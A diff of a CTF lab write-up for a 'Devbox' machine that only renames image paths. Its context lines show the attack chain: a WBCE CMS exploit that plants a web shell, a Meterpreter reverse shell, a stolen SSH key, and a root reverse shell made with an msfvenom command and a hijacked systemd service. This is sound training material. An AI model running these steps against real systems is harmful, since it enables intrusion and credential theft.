@@ -38,11 +38,11 @@ Nmap done: 1 IP address (1 host up) scanned in 234.68 seconds
 This revealed two open ports:
 - **Port 80**: This port hosted a website that displayed a maintenance page.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113133220.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133220.png)
 
 - **Port 8080**: This port hosted a “Self-Debugger” page, seemingly for a Python application.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113133318.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133318.png)
 
 - **Port 22**: SSH Server
 
@@ -64,7 +64,7 @@ While `gobuster` was running, I checked `robots.txt` for any disallowed paths:
 http://10.10.214.82/robots.txt
 ```
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113133525.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133525.png)
 
 This pointed to a `notes` path:
 
@@ -72,13 +72,13 @@ This pointed to a `notes` path:
 http://10.10.214.82/notes
 ```
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113133632.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133632.png)
 
 Opening this path revealed **Admin credentials** and the first flag.
 
 Finally gobuster reveal interesting pages like `notes` and `admin`
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113134120.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134120.png)
 
 ---
 
@@ -86,7 +86,7 @@ Finally gobuster reveal interesting pages like `notes` and `admin`
 
 Investigating the `admin` path reveal a CMS application.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113134341.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134341.png)
 
 With the credentials from `notes`, I tried accessing the admin panel at:
 
@@ -108,11 +108,11 @@ After downloading and modifying the script to fix indentation errors, I executed
 python wbce-cms-exploit.py http://10.10.214.82 admin 123456
 ```
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113134749.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134749.png)
 
 The exploit successfully created a web shell located at `http://10.10.214.82/media/shell.inc`. I confirmed access by running a `id` command, which return the user running this application:
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113134839.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134839.png)
 
 ---
 
@@ -137,19 +137,19 @@ exploit
 
 Now I could upload  `reverse.elf` to the machine.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113135109.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135109.png)
 
 After uploading this file via the CMS’s media tool, I executed `chmod +x reverse.elf` and `/reverse.elf` on the web shell:
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113135241.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135241.png)
 
 I successfully established a Meterpreter session, gaining more control over the environment.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113135622.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135622.png)
 
 I look into `home` directory, looking for users and found the second flag on the developer home directory
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113135954.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135954.png)
 
 ---
 
@@ -157,7 +157,7 @@ I look into `home` directory, looking for users and found the second flag on the
 
 In the `/home/developer/git_keys` directory, I found a folder containing SSH keys. 
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113140201.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113140201.png)
 
 I downloaded `id_ecdsa` to my machine using Meterpreter’s `download` command:
 
@@ -173,7 +173,7 @@ ssh -i id_ecdsa gitolite3@10.10.214.82
 
 However it looks like gitolite3 is some kind of application that can respond to ssh.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113140458.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113140458.png)
 
 What is gitolite3?
 
@@ -220,7 +220,7 @@ HARDCODED_COOKIE_VALUE = "r3m0t3d3bugg3r!"
 
 Using a browser cookie editor, I set this cookie for `http://10.10.91.197:8080` and accessed the debugger interface.
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113140951.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113140951.png)
 
 At this time, I found the third flag under the Debugger home directory. And used the `cat` to retrieve it from the webshell. 
 
@@ -234,7 +234,7 @@ As `developer`, I reviewed sudo permissions with:
 sudo -l
 ```
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113141218.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141218.png)
 
 I could run the following commands:
 ```
@@ -251,7 +251,7 @@ lrwxrwxrwx 1 root root 36 Oct 20 18:05 /etc/systemd/system/multi-user.target.wan
 $ cat /etc/systemd/system/multi-user.target.wants/debugger.service
 ```
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113141308.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141308.png)
 
 Since the service file was writable, I modified it to execute a reverse shell as root. I created a Python reverse shell payload with `msfvenom`:
 
@@ -261,7 +261,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=10.6.10.13 LPORT=4444 -f raw > shell.p
 
 After replacing the `User` to root and `ExecStart` line in `debugger.service` , the file looked like this:
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113141627.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141627.png)
 
 ```
 [Unit]
@@ -280,7 +280,7 @@ WantedBy=multi-user.target
 
 With `nc` set to listen on port 4444,:
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113141941.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141941.png)
 
 I reloaded and restarted the service from the webshell:
 
@@ -289,11 +289,11 @@ sudo systemctl daemon-reload
 sudo systemctl restart debugger
 ```
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113141756.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141756.png)
 
 This successfully spawned a root reverse shell, and navigating to the `/root` directory, I found the final flag:
 
-![](/post/2024/ctf-devbox/images/Pasted%20image%2020241113142016.png)
+![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113142016.png)
 
 ---
 
